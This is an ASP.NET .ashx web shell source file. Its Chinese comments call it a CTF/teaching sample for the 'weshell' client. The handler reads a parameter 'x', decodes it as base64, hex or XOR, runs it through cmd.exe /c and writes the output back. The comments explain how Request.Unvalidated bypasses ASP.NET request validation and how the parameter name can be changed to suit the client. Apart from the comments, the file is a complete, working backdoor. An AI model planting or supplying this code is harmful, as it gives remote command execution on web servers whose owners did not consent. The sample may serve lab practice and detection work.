<%@ WebHandler Language="C#" Class="ShellCmd" %>
using System;
using System.Diagnostics;
using System.Web;

// 教学 / CTF 靶场样本：ASP.NET (C# / .NET Framework，IIS) 命令执行型一句话马（.ashx 版）
// 仅用于你自有或已获明确授权的靶机环境。
//
// 说明：C# 没有内建的 eval / execute（不像 PHP 的 @eval 或 ASP 的 execute），
// 因此 ASP.NET 一句话通常走「命令执行」形态：把参数 x 拼进 cmd /c 执行，
// 并将标准输出与标准错误一并回显。对应 weshell 的「直接提交系统命令」玩法。
//
// 同 shell_aspx_eval.ashx：改用 IHttpHandler 以绕过 ASP.NET 请求验证（无需改 web.config）。
// 连接参数名为 x；管理端 GET/POST 形如 ?x=whoami 即可。
// 若想自定义参数名（如 chopper），把下面 Request.Unvalidated["x"] 改成 Request.Unvalidated["chopper"]，
// 并在 weshell 新建靶机时「参数名」填一致的值即可。

public class ShellCmd : IHttpHandler
{
    public void ProcessRequest(HttpContext ctx)
    {
        ctx.Response.ContentType = "text/plain";
        // weshell 客户端按 enc 参数对命令做编码（base64/hex/xor），此处对应解码；enc 缺省按 base64。
        string __raw = ctx.Request.Unvalidated["x"];
        if (string.IsNullOrEmpty(__raw)) return;
        string cmd = System.Text.Encoding.UTF8.GetString(WshDecode(__raw, ctx.Request.Unvalidated["enc"], ctx.Request.Unvalidated["key"]));

        var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false
        };
        using (var p = Process.Start(psi))
        {
            string stdout = p.StandardOutput.ReadToEnd();
            string stderr = p.StandardError.ReadToEnd();
            p.WaitForExit();
            ctx.Response.Write(stdout);
            if (!string.IsNullOrEmpty(stderr)) ctx.Response.Write(stderr);
        }
    }

    // WshDecode 按 enc 参数还原载荷：hex 走十六进制，xor 与密钥逐字节异或，其余（含空/none/base64）按 base64。
    private static byte[] WshDecode(string s, string enc, string key)
    {
        if (enc == "hex")
        {
            byte[] b = new byte[s.Length / 2];
            for (int i = 0; i < b.Length; i++)
                b[i] = (byte)int.Parse(s.Substring(i * 2, 2), System.Globalization.NumberStyles.HexNumber);
            return b;
        }
        if (enc == "xor")
        {
            byte[] k = System.Text.Encoding.UTF8.GetBytes(key ?? "");
            byte[] b = new byte[s.Length];
            for (int i = 0; i < s.Length; i++) b[i] = (byte)s[i];
            if (k.Length > 0)
                for (int i = 0; i < b.Length; i++) b[i] = (byte)(b[i] ^ k[i % k.Length]);
            return b;
        }
        return Convert.FromBase64String(s);
    }

    public bool IsReusable { get { return false; } }
}
